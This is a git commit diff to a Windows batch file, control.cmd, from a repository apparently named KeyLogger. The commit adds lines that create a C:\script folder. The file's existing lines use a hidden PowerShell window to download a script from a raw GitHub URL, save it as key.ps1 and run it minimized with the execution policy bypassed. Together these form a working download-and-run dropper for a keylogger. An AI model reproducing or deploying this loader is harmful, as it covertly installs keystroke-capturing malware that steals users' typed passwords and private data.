e58ab21bf486a01a1b4a3a229c4d3b4cb0a31b21
huynh044 <143809063+huynh044@users.noreply.github.com>
2023-12-09 17:07:21 +0700

    Update control.cmd

--- control.cmd
+++ control.cmd
@@ -1,5 +1,8 @@
 @echo off
 
+cd C:\
+mkdir script
+cd script
 powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/KeyLogger/main/test.ps1' -OutFile 'key.ps1'"
 start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass .\key.ps1
 
